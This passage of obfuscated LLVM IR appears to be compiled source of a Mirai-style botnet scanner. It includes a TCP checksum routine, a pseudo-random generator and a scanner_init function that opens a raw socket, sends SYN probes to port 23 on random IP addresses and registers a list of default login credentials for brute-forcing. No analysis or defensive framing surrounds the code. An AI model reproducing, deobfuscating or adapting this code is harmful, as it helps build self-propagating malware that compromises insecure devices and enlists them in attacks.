  %61 = xor i64 -1, -1
  %62 = and i64 %58, %61
  %63 = or i64 %60, %62
  %64 = xor i64 %58, -1
  %65 = trunc i64 %63 to i16
  ret i16 %65
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #0 {
  %5 = alloca %struct.iphdr*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i16, align 2
  %8 = alloca i32, align 4
  %9 = alloca i16*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %5, align 8
  store i8* %1, i8** %6, align 8
  store i16 %2, i16* %7, align 2
  store i32 %3, i32* %8, align 4
  %14 = load i8*, i8** %6, align 8
  %15 = bitcast i8* %14 to i16*
  store i16* %15, i16** %9, align 8
  %16 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %16, i32 0, i32 8
  %18 = load i32, i32* %17, align 4
  store i32 %18, i32* %10, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %20 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %19, i32 0, i32 9
  %21 = load i32, i32* %20, align 4
  store i32 %21, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %22 = load i32, i32* %8, align 4
  store i32 %22, i32* %13, align 4
  br label %23

; <label>:23:                                     ; preds = %26, %4
  %24 = load i32, i32* %8, align 4
  %25 = icmp sgt i32 %24, 1
  br i1 %25, label %26, label %41

; <label>:26:                                     ; preds = %23
  %27 = load i16*, i16** %9, align 8
  %28 = load i16, i16* %27, align 2
  %29 = zext i16 %28 to i32
  %30 = load i32, i32* %12, align 4
  %31 = sub i32 0, %29
  %32 = sub i32 %30, %31
  %33 = add i32 %30, %29
  store i32 %32, i32* %12, align 4
  %34 = load i16*, i16** %9, align 8
  %35 = getelementptr inbounds i16, i16* %34, i32 1
  store i16* %35, i16** %9, align 8
  %36 = load i32, i32* %8, align 4
  %37 = sub i32 %36, 664474551
  %38 = sub i32 %37, 2
  %39 = add i32 %38, 664474551
  %40 = sub nsw i32 %36, 2
  store i32 %39, i32* %8, align 4
  br label %23

; <label>:41:                                     ; preds = %23
  %42 = load i32, i32* %8, align 4
  %43 = icmp eq i32 %42, 1
  br i1 %43, label %44, label %53

; <label>:44:                                     ; preds = %41
  %45 = load i16*, i16** %9, align 8
  %46 = bitcast i16* %45 to i8*
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = load i32, i32* %12, align 4
  %50 = sub i32 0, %48
  %51 = sub i32 %49, %50
  %52 = add i32 %49, %48
  store i32 %51, i32* %12, align 4
  br label %53

; <label>:53:                                     ; preds = %44, %41
  %54 = load i32, i32* %10, align 4
  %55 = lshr i32 %54, 16
  %56 = xor i32 65535, -1
  %57 = xor i32 %55, %56
  %58 = and i32 %57, %55
  %59 = and i32 %55, 65535
  %60 = load i32, i32* %12, align 4
  %61 = sub i32 0, %58
  %62 = sub i32 %60, %61
  %63 = add i32 %60, %58
  store i32 %62, i32* %12, align 4
  %64 = load i32, i32* %10, align 4
  %65 = xor i32 %64, -1
  %66 = xor i32 65535, -1
  %67 = xor i32 -213004175, -1
  %68 = or i32 %65, %66
  %69 = or i32 -213004175, %67
  %70 = xor i32 %68, -1
  %71 = and i32 %70, %69
  %72 = and i32 %64, 65535
  %73 = load i32, i32* %12, align 4
  %74 = sub i32 %73, -1625842492
  %75 = add i32 %74, %71
  %76 = add i32 %75, -1625842492
  %77 = add i32 %73, %71
  store i32 %76, i32* %12, align 4
  %78 = load i32, i32* %11, align 4
  %79 = lshr i32 %78, 16
  %80 = xor i32 %79, -1
  %81 = xor i32 65535, -1
  %82 = xor i32 1317538760, -1
  %83 = or i32 %80, %81
  %84 = or i32 1317538760, %82
  %85 = xor i32 %83, -1
  %86 = and i32 %85, %84
  %87 = and i32 %79, 65535
  %88 = load i32, i32* %12, align 4
  %89 = sub i32 %88, 1639718982
  %90 = add i32 %89, %86
  %91 = add i32 %90, 1639718982
  %92 = add i32 %88, %86
  store i32 %91, i32* %12, align 4
  %93 = load i32, i32* %11, align 4
  %94 = xor i32 %93, -1
  %95 = xor i32 65535, -1
  %96 = xor i32 391188643, -1
  %97 = or i32 %94, %95
  %98 = or i32 391188643, %96
  %99 = xor i32 %97, -1
  %100 = and i32 %99, %98
  %101 = and i32 %93, 65535
  %102 = load i32, i32* %12, align 4
  %103 = sub i32 %102, -806412319
  %104 = add i32 %103, %100
  %105 = add i32 %104, -806412319
  %106 = add i32 %102, %100
  store i32 %105, i32* %12, align 4
  %107 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %108 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %107, i32 0, i32 6
  %109 = load i8, i8* %108, align 1
  %110 = zext i8 %109 to i16
  %111 = call zeroext i16 @htons(i16 zeroext %110) #7
  %112 = zext i16 %111 to i32
  %113 = load i32, i32* %12, align 4
  %114 = sub i32 0, %113
  %115 = sub i32 0, %112
  %116 = add i32 %114, %115
  %117 = sub i32 0, %116
  %118 = add i32 %113, %112
  store i32 %117, i32* %12, align 4
  %119 = load i16, i16* %7, align 2
  %120 = zext i16 %119 to i32
  %121 = load i32, i32* %12, align 4
  %122 = sub i32 %121, 641604617
  %123 = add i32 %122, %120
  %124 = add i32 %123, 641604617
  %125 = add i32 %121, %120
  store i32 %124, i32* %12, align 4
  br label %126

; <label>:126:                                    ; preds = %130, %53
  %127 = load i32, i32* %12, align 4
  %128 = lshr i32 %127, 16
  %129 = icmp ne i32 %128, 0
  br i1 %129, label %130, label %141

; <label>:130:                                    ; preds = %126
  %131 = load i32, i32* %12, align 4
  %132 = xor i32 65535, -1
  %133 = xor i32 %131, %132
  %134 = and i32 %133, %131
  %135 = and i32 %131, 65535
  %136 = load i32, i32* %12, align 4
  %137 = lshr i32 %136, 16
  %138 = sub i32 0, %137
  %139 = sub i32 %134, %138
  %140 = add i32 %134, %137
  store i32 %139, i32* %12, align 4
  br label %126

; <label>:141:                                    ; preds = %126
  %142 = load i32, i32* %12, align 4
  %143 = xor i32 %142, -1
  %144 = and i32 -1, %143
  %145 = xor i32 -1, -1
  %146 = and i32 %142, %145
  %147 = or i32 %144, %146
  %148 = xor i32 %142, -1
  %149 = trunc i32 %147 to i16
  ret i16 %149
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_next() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @x, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 11
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, -1
  %7 = and i32 %4, %6
  %8 = xor i32 %4, -1
  %9 = and i32 %5, %8
  %10 = or i32 %7, %9
  %11 = xor i32 %5, %4
  store i32 %10, i32* %1, align 4
  %12 = load i32, i32* %1, align 4
  %13 = lshr i32 %12, 8
  %14 = load i32, i32* %1, align 4
  %15 = xor i32 %14, -1
  %16 = and i32 683419079, %15
  %17 = xor i32 683419079, -1
  %18 = and i32 %14, %17
  %19 = xor i32 %13, -1
  %20 = and i32 %19, 683419079
  %21 = and i32 %13, %17
  %22 = or i32 %16, %18
  %23 = or i32 %20, %21
  %24 = xor i32 %22, %23
  %25 = xor i32 %14, %13
  store i32 %24, i32* %1, align 4
  %26 = load i32, i32* @y, align 4
  store i32 %26, i32* @x, align 4
  %27 = load i32, i32* @z, align 4
  store i32 %27, i32* @y, align 4
  %28 = load i32, i32* @w, align 4
  store i32 %28, i32* @z, align 4
  %29 = load i32, i32* @w, align 4
  %30 = lshr i32 %29, 19
  %31 = load i32, i32* @w, align 4
  %32 = xor i32 %31, -1
  %33 = and i32 -273212314, %32
  %34 = xor i32 -273212314, -1
  %35 = and i32 %31, %34
  %36 = xor i32 %30, -1
  %37 = and i32 %36, -273212314
  %38 = and i32 %30, %34
  %39 = or i32 %33, %35
  %40 = or i32 %37, %38
  %41 = xor i32 %39, %40
  %42 = xor i32 %31, %30
  store i32 %41, i32* @w, align 4
  %43 = load i32, i32* %1, align 4
  %44 = load i32, i32* @w, align 4
  %45 = xor i32 %44, -1
  %46 = and i32 -907468285, %45
  %47 = xor i32 -907468285, -1
  %48 = and i32 %44, %47
  %49 = xor i32 %43, -1
  %50 = and i32 %49, -907468285
  %51 = and i32 %43, %47
  %52 = or i32 %46, %48
  %53 = or i32 %50, %51
  %54 = xor i32 %52, %53
  %55 = xor i32 %44, %43
  store i32 %54, i32* @w, align 4
  %56 = load i32, i32* @w, align 4
  ret i32 %56
}

; Function Attrs: noinline nounwind uwtable
define void @rand_str(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  br label %5

; <label>:5:                                      ; preds = %63, %2
  %6 = load i32, i32* %4, align 4
  %7 = icmp sgt i32 %6, 0
  br i1 %7, label %8, label %64

; <label>:8:                                      ; preds = %5
  %9 = load i32, i32* %4, align 4
  %10 = icmp sge i32 %9, 4
  br i1 %10, label %11, label %24

; <label>:11:                                     ; preds = %8
  %12 = call i32 @rand_next()
  %13 = load i8*, i8** %3, align 8
  %14 = bitcast i8* %13 to i32*
  store i32 %12, i32* %14, align 4
  %15 = load i8*, i8** %3, align 8
  %16 = getelementptr inbounds i8, i8* %15, i64 4
  store i8* %16, i8** %3, align 8
  %17 = load i32, i32* %4, align 4
  %18 = sext i32 %17 to i64
  %19 = sub i64 %18, 7962695765657087425
  %20 = sub i64 %19, 4
  %21 = add i64 %20, 7962695765657087425
  %22 = sub i64 %18, 4
  %23 = trunc i64 %21 to i32
  store i32 %23, i32* %4, align 4
  br label %63

; <label>:24:                                     ; preds = %8
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %25, 2
  br i1 %26, label %27, label %45

; <label>:27:                                     ; preds = %24
  %28 = call i32 @rand_next()
  %29 = xor i32 65535, -1
  %30 = xor i32 %28, %29
  %31 = and i32 %30, %28
  %32 = and i32 %28, 65535
  %33 = trunc i32 %31 to i16
  %34 = load i8*, i8** %3, align 8
  %35 = bitcast i8* %34 to i16*
  store i16 %33, i16* %35, align 2
  %36 = load i8*, i8** %3, align 8
  %37 = getelementptr inbounds i8, i8* %36, i64 2
  store i8* %37, i8** %3, align 8
  %38 = load i32, i32* %4, align 4
  %39 = sext i32 %38 to i64
  %40 = sub i64 %39, -310511991516830168
  %41 = sub i64 %40, 2
  %42 = add i64 %41, -310511991516830168
  %43 = sub i64 %39, 2
  %44 = trunc i64 %42 to i32
  store i32 %44, i32* %4, align 4
  br label %62

; <label>:45:                                     ; preds = %24
  %46 = call i32 @rand_next()
  %47 = xor i32 %46, -1
  %48 = xor i32 255, -1
  %49 = xor i32 471159588, -1
  %50 = or i32 %47, %48
  %51 = or i32 471159588, %49
  %52 = xor i32 %50, -1
  %53 = and i32 %52, %51
  %54 = and i32 %46, 255
  %55 = trunc i32 %53 to i8
  %56 = load i8*, i8** %3, align 8
  %57 = getelementptr inbounds i8, i8* %56, i32 1
  store i8* %57, i8** %3, align 8
  store i8 %55, i8* %56, align 1
  %58 = load i32, i32* %4, align 4
  %59 = sub i32 0, -1
  %60 = sub i32 %58, %59
  %61 = add nsw i32 %58, -1
  store i32 %60, i32* %4, align 4
  br label %62

; <label>:62:                                     ; preds = %45, %27
  br label %63

; <label>:63:                                     ; preds = %62, %11
  br label %5

; <label>:64:                                     ; preds = %5
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @rand_alpha_str(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [32 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  call void @table_unlock_val(i8 zeroext 28)
  %6 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i32 0, i32 0
  %7 = call i8* @table_retrieve_val(i32 28, i32* null)
  %8 = call i8* @strcpy(i8* %6, i8* %7) #6
  br label %9

; <label>:9:                                      ; preds = %16, %2
  %10 = load i32, i32* %4, align 4
  %11 = sub i32 %10, -1597897217
  %12 = add i32 %11, -1
  %13 = add i32 %12, -1597897217
  %14 = add nsw i32 %10, -1
  store i32 %13, i32* %4, align 4
  %15 = icmp ne i32 %10, 0
  br i1 %15, label %16, label %26

; <label>:16:                                     ; preds = %9
  %17 = call i32 @rand_next()
  %18 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i32 0, i32 0
  %19 = call i32 @util_strlen(i8* %18)
  %20 = urem i32 %17, %19
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i64 0, i64 %21
  %23 = load i8, i8* %22, align 1
  %24 = load i8*, i8** %3, align 8
  %25 = getelementptr inbounds i8, i8* %24, i32 1
  store i8* %25, i8** %3, align 8
  store i8 %23, i8* %24, align 1
  br label %9

; <label>:26:                                     ; preds = %9
  call void @table_lock_val(i8 zeroext 28)
  ret void
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @scanner_init() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i16, align 2
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.fd_set.18, align 8
  %6 = alloca %struct.fd_set.18, align 8
  %7 = alloca %struct.scanner_connection*, align 8
  %8 = alloca %struct.timeval.19, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.sockaddr_in, align 4
  %15 = alloca %struct.iphdr*, align 8
  %16 = alloca %struct.tcphdr*, align 8
  %17 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %18 = alloca i32, align 4
  %19 = alloca [1514 x i8], align 16
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.tcphdr*, align 8
  %22 = alloca %struct.scanner_connection*, align 8
  %23 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  %34 = alloca i8*, align 8
  %35 = alloca i32, align 4
  %36 = alloca i8*, align 8
  %37 = alloca i32, align 4
  %38 = alloca i8*, align 8
  %39 = alloca i32, align 4
  %40 = alloca i8*, align 8
  %41 = alloca i32, align 4
  %42 = alloca i8*, align 8
  %43 = alloca i32, align 4
  %44 = alloca i8*, align 8
  %45 = alloca i32, align 4
  %46 = call i32 @fork() #6
  store i32 %46, i32* @scanner_pid, align 4
  %47 = load i32, i32* @scanner_pid, align 4
  %48 = icmp sgt i32 %47, 0
  br i1 %48, label %52, label %49

; <label>:49:                                     ; preds = %0
  %50 = load i32, i32* @scanner_pid, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %53

; <label>:52:                                     ; preds = %49, %0
  ret void

; <label>:53:                                     ; preds = %49
  %54 = call i32 @util_local_addr()
  store i32 %54, i32* @LOCAL_ADDR, align 4
  call void @rand_init()
  %55 = call i64 @time(i64* null) #6
  %56 = trunc i64 %55 to i32
  store i32 %56, i32* @fake_time, align 4
  %57 = call noalias i8* @calloc(i64 256, i64 296) #6
  %58 = bitcast i8* %57 to %struct.scanner_connection*
  store %struct.scanner_connection* %58, %struct.scanner_connection** @conn_table, align 8
  store i32 0, i32* %1, align 4
  br label %59

; <label>:59:                                     ; preds = %73, %53
  %60 = load i32, i32* %1, align 4
  %61 = icmp slt i32 %60, 256
  br i1 %61, label %62, label %79

; <label>:62:                                     ; preds = %59
  %63 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %64 = load i32, i32* %1, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %63, i64 %65
  %67 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %66, i32 0, i32 3
  store i32 0, i32* %67, align 8
  %68 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %69 = load i32, i32* %1, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %68, i64 %70
  %72 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %71, i32 0, i32 1
  store i32 -1, i32* %72, align 8
  br label %73

; <label>:73:                                     ; preds = %62
  %74 = load i32, i32* %1, align 4
  %75 = add i32 %74, -153000796
  %76 = add i32 %75, 1
  %77 = sub i32 %76, -153000796
  %78 = add nsw i32 %74, 1
  store i32 %77, i32* %1, align 4
  br label %59

; <label>:79:                                     ; preds = %59
  %80 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %80, i32* @rsck, align 4
  %81 = icmp eq i32 %80, -1
  br i1 %81, label %82, label %83

; <label>:82:                                     ; preds = %79
  br label %83

; <label>:83:                                     ; preds = %82, %79
  %84 = load i32, i32* @rsck, align 4
  %85 = load i32, i32* @rsck, align 4
  %86 = call i32 (i32, i32, ...) @fcntl(i32 %85, i32 3, i32 0)
  %87 = and i32 2048, %86
  %88 = xor i32 2048, %86
  %89 = or i32 %87, %88
  %90 = or i32 2048, %86
  %91 = call i32 (i32, i32, ...) @fcntl(i32 %84, i32 4, i32 %89)
  store i32 1, i32* %1, align 4
  %92 = load i32, i32* @rsck, align 4
  %93 = bitcast i32* %1 to i8*
  %94 = call i32 @setsockopt(i32 %92, i32 0, i32 3, i8* %93, i32 4) #6
  %95 = icmp ne i32 %94, 0
  br i1 %95, label %96, label %99

; <label>:96:                                     ; preds = %83
  %97 = load i32, i32* @rsck, align 4
  %98 = call i32 @close(i32 %97)
  br label %99

; <label>:99:                                     ; preds = %96, %83
  br label %100

; <label>:100:                                    ; preds = %111, %99
  %101 = call i32 @rand_next()
  %102 = xor i32 %101, -1
  %103 = xor i32 65535, -1
  %104 = xor i32 1646735554, -1
  %105 = or i32 %102, %103
  %106 = or i32 1646735554, %104
  %107 = xor i32 %105, -1
  %108 = and i32 %107, %106
  %109 = and i32 %101, 65535
  %110 = trunc i32 %108 to i16
  store i16 %110, i16* %2, align 2
  br label %111

; <label>:111:                                    ; preds = %100
  %112 = load i16, i16* %2, align 2
  %113 = call zeroext i16 @ntohs(i16 zeroext %112) #7
  %114 = zext i16 %113 to i32
  %115 = icmp slt i32 %114, 1024
  br i1 %115, label %100, label %116

; <label>:116:                                    ; preds = %111
  store %struct.iphdr* bitcast ([40 x i8]* @scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %3, align 8
  %117 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %118 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %117, i64 1
  %119 = bitcast %struct.iphdr* %118 to %struct.tcphdr*
  store %struct.tcphdr* %119, %struct.tcphdr** %4, align 8
  %120 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %121 = bitcast %struct.iphdr* %120 to i8*
  %122 = load i8, i8* %121, align 4
  %123 = xor i8 -16, -1
  %124 = xor i8 %122, %123
  %125 = and i8 %124, %122
  %126 = and i8 %122, -16
  %127 = xor i8 %125, -1
  %128 = xor i8 5, -1
  %129 = xor i8 71, -1
  %130 = and i8 %127, 71
  %131 = and i8 %125, %129
  %132 = and i8 %128, 71
  %133 = and i8 5, %129
  %134 = or i8 %130, %131
  %135 = or i8 %132, %133
  %136 = xor i8 %134, %135
  %137 = or i8 %127, %128
  %138 = xor i8 %137, -1
  %139 = or i8 71, %129
  %140 = and i8 %138, %139
  %141 = or i8 %136, %140
  %142 = or i8 %125, 5
  store i8 %141, i8* %121, align 4
  %143 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %144 = bitcast %struct.iphdr* %143 to i8*
  %145 = load i8, i8* %144, align 4
  %146 = xor i8 15, -1
  %147 = xor i8 %145, %146
  %148 = and i8 %147, %145
  %149 = and i8 %145, 15
  %150 = and i8 %148, 64
  %151 = xor i8 %148, 64
  %152 = or i8 %150, %151
  %153 = or i8 %148, 64
  store i8 %152, i8* %144, align 4
  %154 = call zeroext i16 @htons(i16 zeroext 40) #7
  %155 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %156 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %155, i32 0, i32 2
  store i16 %154, i16* %156, align 2
  %157 = call i32 @rand_next()
  %158 = trunc i32 %157 to i16
  %159 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %160 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i32 0, i32 3
  store i16 %158, i16* %160, align 4
  %161 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %162 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %161, i32 0, i32 5
  store i8 64, i8* %162, align 4
  %163 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %164 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %163, i32 0, i32 6
  store i8 6, i8* %164, align 1
  %165 = call zeroext i16 @htons(i16 zeroext 23) #7
  %166 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %167 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %166, i32 0, i32 1
  store i16 %165, i16* %167, align 2
  %168 = load i16, i16* %2, align 2
  %169 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %170 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %169, i32 0, i32 0
  store i16 %168, i16* %170, align 4
  %171 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %172 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %171, i32 0, i32 4
  %173 = load i16, i16* %172, align 4
  %174 = xor i16 %173, -1
  %175 = xor i16 -241, -1
  %176 = xor i16 4389, -1
  %177 = or i16 %174, %175
  %178 = or i16 4389, %176
  %179 = xor i16 %177, -1
  %180 = and i16 %179, %178
  %181 = and i16 %173, -241
  %182 = and i16 %180, 80
  %183 = xor i16 %180, 80
  %184 = or i16 %182, %183
  %185 = or i16 %180, 80
  store i16 %184, i16* %172, align 4
  %186 = call i32 @rand_next()
  %187 = xor i32 %186, -1
  %188 = xor i32 65535, -1
  %189 = xor i32 -646088006, -1
  %190 = or i32 %187, %188
  %191 = or i32 -646088006, %189
  %192 = xor i32 %190, -1
  %193 = and i32 %192, %191
  %194 = and i32 %186, 65535
  %195 = trunc i32 %193 to i16
  %196 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %197 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %196, i32 0, i32 5
  store i16 %195, i16* %197, align 2
  %198 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %199 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %198, i32 0, i32 4
  %200 = load i16, i16* %199, align 4
  %201 = xor i16 -513, -1
  %202 = xor i16 %200, %201
  %203 = and i16 %202, %200
  %204 = and i16 %200, -513
  %205 = xor i16 %203, -1
  %206 = xor i16 512, -1
  %207 = xor i16 32660, -1
  %208 = and i16 %205, 32660
  %209 = and i16 %203, %207
  %210 = and i16 %206, 32660
  %211 = and i16 512, %207
  %212 = or i16 %208, %209
  %213 = or i16 %210, %211
  %214 = xor i16 %212, %213
  %215 = or i16 %205, %206
  %216 = xor i16 %215, -1
  %217 = or i16 32660, %207
  %218 = and i16 %216, %217
  %219 = or i16 %214, %218
  %220 = or i16 %203, 512
  store i16 %219, i16* %199, align 4
  call void @add_auth_entry(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i32 0, i32 0), i16 zeroext 6)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i32 0, i32 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.5, i32 0, i32 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.6, i32 0, i32 0), i16 zeroext 14)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.8, i32 0, i32 0), i16 zeroext 17)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.3, i32 0, i32 0), i16 zeroext 14)
  call void @add_auth_entry(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.11, i32 0, i32 0), i16 zeroext 12)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.11, i32 0, i32 0), i16 zeroext 11)
  call void @add_auth_entry(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.13, i32 0, i32 0), i16 zeroext 20)
  br label %221

; <label>:221:                                    ; preds = %1104, %116
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %222 = load i32, i32* @fake_time, align 4
  %223 = load i32, i32* %10, align 4
  %224 = icmp ne i32 %222, %223
  br i1 %224, label %225, label %292

; <label>:225:                                    ; preds = %221
  %226 = load i32, i32* @fake_time, align 4
  store i32 %226, i32* %10, align 4
  store i32 0, i32* %1, align 4
  br label %227

; <label>:227:                                    ; preds = %285, %225
  %228 = load i32, i32* %1, align 4
  %229 = icmp slt i32 %228, 384
  br i1 %229, label %230, label %291

; <label>:230:                                    ; preds = %227
  %231 = bitcast %struct.sockaddr_in* %14 to i8*
  call void @llvm.memset.p0i8.i64(i8* %231, i8 0, i64 16, i32 4, i1 false)
  store %struct.iphdr* bitcast ([40 x i8]* @scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %15, align 8
  %232 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %233 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %232, i64 1
  %234 = bitcast %struct.iphdr* %233 to %struct.tcphdr*
  store %struct.tcphdr* %234, %struct.tcphdr** %16, align 8
  %235 = call i32 @rand_next()
  %236 = trunc i32 %235 to i16
  %237 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %238 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %237, i32 0, i32 3
  store i16 %236, i16* %238, align 4
  %239 = load i32, i32* @LOCAL_ADDR, align 4
  %240 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %241 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %240, i32 0, i32 8
  store i32 %239, i32* %241, align 4
  %242 = call i32 @get_random_ip()
  %243 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %244 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %243, i32 0, i32 9
  store i32 %242, i32* %244, align 4
  %245 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %246 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %245, i32 0, i32 7
  store i16 0, i16* %246, align 2
  %247 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %248 = bitcast %struct.iphdr* %247 to i16*
  %249 = call zeroext i16 @checksum_generic(i16* %248, i32 20)
  %250 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %251 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %250, i32 0, i32 7
  store i16 %249, i16* %251, align 2
  %252 = call zeroext i16 @htons(i16 zeroext 23) #7
  %253 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %254 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %253, i32 0, i32 1
  store i16 %252, i16* %254, align 2
  %255 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %256 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %255, i32 0, i32 9
  %257 = load i32, i32* %256, align 4
  %258 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %259 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %258, i32 0, i32 2
  store i32 %257, i32* %259, align 4
  %260 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %261 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %260, i32 0, i32 6
  store i16 0, i16* %261, align 4
  %262 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %263 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %264 = bitcast %struct.tcphdr* %263 to i8*
  %265 = call zeroext i16 @htons(i16 zeroext 20) #7
  %266 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %262, i8* %264, i16 zeroext %265, i32 20)
